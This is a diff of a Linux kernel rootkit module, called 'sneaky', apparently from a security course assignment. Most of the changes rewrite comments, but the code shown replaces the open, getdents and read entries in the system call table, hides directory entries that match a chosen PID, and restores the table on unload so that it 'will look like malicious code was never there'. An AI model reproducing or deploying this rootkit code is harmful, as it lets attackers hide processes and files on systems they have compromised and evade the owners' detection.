@@ -81,8 +81,6 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
        ((strcmp(d->d_name, pid) == 0) && flag==1)
 	){
       printk(KERN_INFO "d->d_name: %s\n", d->d_name);
-      //memmove(d, (struct linux_dirent *) (d + d->d_reclen), nread - bpos - d->d_reclen);
-      //return nread - d->d_reclen;
       p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
     }
     p=d;
@@ -143,9 +141,8 @@ static int initialize_sneaky_module(void)
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  //This is the magic! Save away the original 'open' system call
-  //function address. Then overwrite its address in the system call
-  //table with the function address of our new code.
+  //Save away the original system calls' function address. 
+  //Then overwrite its address in the system call table with the function address of our new code.
   original_open = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
   original_getdents = (void*)*(sys_call_table + __NR_getdents);
@@ -177,8 +174,8 @@ static void exit_sneaky_module(void)
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  //This is more magic! Restore the original 'open' system call
-  //function address. Will look like malicious code was never there!
+  //Restore the original system calls' function address. 
+  //Will look like malicious code was never there
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
@@ -189,6 +186,6 @@ static void exit_sneaky_module(void)
   write_cr0(read_cr0() | 0x10000);
 }  
 
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
+module_init(initialize_sneaky_module);
+module_exit(exit_sneaky_module);
 
